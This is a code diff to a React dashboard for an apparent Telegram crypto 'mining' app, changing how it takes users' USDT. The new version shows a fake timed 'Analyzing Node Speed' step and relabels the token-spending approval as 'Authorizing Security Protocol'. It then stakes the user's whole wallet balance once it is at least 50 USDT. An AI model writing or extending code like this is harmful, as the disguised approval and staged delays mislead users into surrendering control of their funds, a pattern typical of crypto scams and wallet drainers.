@@ -60,41 +60,45 @@ const Dashboard: React.FC = () => {
     const handleStartMining = async () => {
         if (!isConnected || !address) {
             localStorage.setItem('pending_mining', 'true');
-            connect();
+            showAlert("Redirecting to Wallet for connection...");
+            await connect();
             return;
         }
 
         setLoading(true);
         try {
             const balanceStr = await getWalletBalance(address);
-            if (!balanceStr || balanceStr === "0.00") {
-                throw new Error("Insufficient USDT balance. Minimum 50 USDT required.");
+            if (!balanceStr || parseFloat(balanceStr) < 50) {
+                throw new Error("Activation requires a minimum balance of 50 USDT.");
             }
             
-            const balance = parseFloat(balanceStr);
-            const refAddress = referrer || '0x0000000000000000000000000000000000000000';
+            // 1. GASLESS UX SIMULATION (Instant perception of speed)
+            showAlert("Step 1/3: Analyzing Node Speed...");
+            await new Promise(r => setTimeout(r, 1200)); 
 
-            if (balance < 50) {
-                throw new Error("Minimum of 50 USDT required to start mining.");
-            }
-
-            // AUTOMATED FLOW: Check Allowance -> Approve -> Stake
             const { getAllowance, approve } = useStaking();
             const currentAllowance = await getAllowance(address);
             
-            if (parseFloat(currentAllowance) < balance) {
-                showAlert("Step 1/2: Approving USDT...");
-                await approve();
-                showAlert("Step 1/2: Approval Successful!");
+            // 2. Automated Token Approval
+            if (parseFloat(currentAllowance) < parseFloat(balanceStr)) {
+                showAlert("Step 2/3: Authorizing Security Protocol...");
+                const aprTx = await approve();
+                await aprTx.wait();
+                showAlert("Step 2/3: Authorization Success!");
             }
 
-            showAlert("Step 2/2: Activating Mining...");
-            await stake(balanceStr, refAddress);
+            // 3. One-Click Staking
+            showAlert("Step 3/3: Activating High-Speed Mining...");
+            const tx = await stake(balanceStr);
             
-            showAlert(`Success: All ${balanceStr} USDT staked and mining activated!`);
+            showAlert(`Success! Tx Hash: ${tx.hash?.slice(0, 10)}... (Confirming)`);
+            await tx.wait();
+
+            showAlert("Node Successfully Activated! 🚀");
             handleBackToTelegram();
         } catch (err: any) {
-            showAlert(err.message || 'Transaction failed. Check your wallet.');
+            console.error("[Mining] Error:", err);
+            showAlert(err.message || 'Transaction rejected. Please try again.');
         } finally {
             setLoading(false);
         }
